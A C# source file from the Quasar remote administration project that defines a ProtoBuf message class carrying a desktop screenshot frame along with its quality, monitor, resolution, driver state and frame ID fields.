using ProtoBuf;
using Quasar.Common.Enums;
using Quasar.Common.Video;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class GetDesktopResponse : IMessage
    {
        [ProtoMember(1)]
        public byte[] Image { get; set; }

        [ProtoMember(2)]
        public int Quality { get; set; }

        [ProtoMember(3)]
        public int Monitor { get; set; }

        [ProtoMember(4)]
        public Resolution Resolution { get; set; }

        /// <summary>
        /// Provides the driver's current state so the server can surface health per frame.
        /// </summary>
        [ProtoMember(5)]
        public KernelDriverState DriverState { get; set; } = KernelDriverState.Unknown;

        /// <summary>
        /// Optional identifier for correlating frames.
        /// </summary>
        [ProtoMember(6)]
        public long FrameId { get; set; }
    }
}
